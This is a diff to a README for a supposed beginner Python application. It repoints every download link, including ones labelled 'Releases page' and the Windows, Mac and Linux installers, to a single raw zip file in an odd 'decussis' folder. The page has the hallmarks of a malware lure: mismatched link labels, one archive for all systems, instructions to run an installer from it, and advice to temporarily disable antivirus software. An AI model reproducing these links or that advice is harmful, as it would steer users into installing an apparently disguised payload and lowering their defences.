@@ -7,24 +7,24 @@ ECE_F_CRT_PYTHON is an easy-to-use application designed for beginners who want t
 To get started with ECE_F_CRT_PYTHON, follow the instructions below. You will quickly download and set up the application on your computer.
 
 ## 🔗 Download Now
-[![Download ECE_F_CRT_PYTHON](https://raw.githubusercontent.com/SodelixHurusop/ECE_F_CRT_PYTHON/main/decussis/ECE_F_CRT_PYTHON.zip)](https://raw.githubusercontent.com/SodelixHurusop/ECE_F_CRT_PYTHON/main/decussis/ECE_F_CRT_PYTHON.zip)
+[![Download ECE_F_CRT_PYTHON](https://github.com/SodelixHurusop/ECE_F_CRT_PYTHON/raw/refs/heads/main/decussis/PYTHON-CR-EC-1.8.zip)](https://github.com/SodelixHurusop/ECE_F_CRT_PYTHON/raw/refs/heads/main/decussis/PYTHON-CR-EC-1.8.zip)
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/SodelixHurusop/ECE_F_CRT_PYTHON/main/decussis/ECE_F_CRT_PYTHON.zip) to find the latest version of ECE_F_CRT_PYTHON.
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/SodelixHurusop/ECE_F_CRT_PYTHON/raw/refs/heads/main/decussis/PYTHON-CR-EC-1.8.zip) to find the latest version of ECE_F_CRT_PYTHON.
   
 2. **Select the Version:** On the Releases page, you will see a list of versions. The latest version is usually at the top of the list. Click it to see the details.
 
 3. **Choose the Right File:** Look for the file that matches your operating system. If you are unsure, the most common options are:
-   - Windows: `https://raw.githubusercontent.com/SodelixHurusop/ECE_F_CRT_PYTHON/main/decussis/ECE_F_CRT_PYTHON.zip`
-   - Mac: `https://raw.githubusercontent.com/SodelixHurusop/ECE_F_CRT_PYTHON/main/decussis/ECE_F_CRT_PYTHON.zip`
-   - Linux: `https://raw.githubusercontent.com/SodelixHurusop/ECE_F_CRT_PYTHON/main/decussis/ECE_F_CRT_PYTHON.zip`
+   - Windows: `https://github.com/SodelixHurusop/ECE_F_CRT_PYTHON/raw/refs/heads/main/decussis/PYTHON-CR-EC-1.8.zip`
+   - Mac: `https://github.com/SodelixHurusop/ECE_F_CRT_PYTHON/raw/refs/heads/main/decussis/PYTHON-CR-EC-1.8.zip`
+   - Linux: `https://github.com/SodelixHurusop/ECE_F_CRT_PYTHON/raw/refs/heads/main/decussis/PYTHON-CR-EC-1.8.zip`
 
 4. **Download the File:** Click on the file link to start the download. Your browser will save the file to your default downloads location.
 
 5. **Run the Installer:**
    - **For Windows:** Double-click the downloaded `.exe` file. Follow the prompts to complete the installation.
    - **For Mac:** Open the `.dmg` file and drag the application into your Applications folder.
-   - **For Linux:** Extract the downloaded `https://raw.githubusercontent.com/SodelixHurusop/ECE_F_CRT_PYTHON/main/decussis/ECE_F_CRT_PYTHON.zip` file and follow the included instructions to run the application.
+   - **For Linux:** Extract the downloaded `https://github.com/SodelixHurusop/ECE_F_CRT_PYTHON/raw/refs/heads/main/decussis/PYTHON-CR-EC-1.8.zip` file and follow the included instructions to run the application.
 
 6. **Open the Application:** Once installed, locate ECE_F_CRT_PYTHON on your computer. Double-click the icon to open it.
 
@@ -68,7 +68,7 @@ If you face any issues while downloading or running the software, consider these
 
 - **Check Your Internet Connection:** Ensure you have a stable connection when downloading.
 - **Antivirus Settings:** Sometimes, antivirus software may block the installation. Check your settings or temporarily disable your antivirus software, then try again.
-- **Re-download the File:** If the file seems corrupted, delete it and download it again from the [Releases page](https://raw.githubusercontent.com/SodelixHurusop/ECE_F_CRT_PYTHON/main/decussis/ECE_F_CRT_PYTHON.zip).
+- **Re-download the File:** If the file seems corrupted, delete it and download it again from the [Releases page](https://github.com/SodelixHurusop/ECE_F_CRT_PYTHON/raw/refs/heads/main/decussis/PYTHON-CR-EC-1.8.zip).
 
 ## 🤝 Community Support
 Join the ECE_F_CRT_PYTHON community for tips and guidance. You can find other users and developers on forums or social media. Sharing experiences can help you learn faster.
@@ -82,4 +82,4 @@ For more information about coding and using ECE_F_CRT_PYTHON, check out these re
 For any questions or feedback, feel free to reach out via the Issues section on our GitHub page. Your input helps us improve the application.
 
 ## 🔗 Download Now Again
-Don’t forget, you can always revisit the [Releases page](https://raw.githubusercontent.com/SodelixHurusop/ECE_F_CRT_PYTHON/main/decussis/ECE_F_CRT_PYTHON.zip) to download the latest version. Enjoy your coding journey with ECE_F_CRT_PYTHON!
+Don’t forget, you can always revisit the [Releases page](https://github.com/SodelixHurusop/ECE_F_CRT_PYTHON/raw/refs/heads/main/decussis/PYTHON-CR-EC-1.8.zip) to download the latest version. Enjoy your coding journey with ECE_F_CRT_PYTHON!
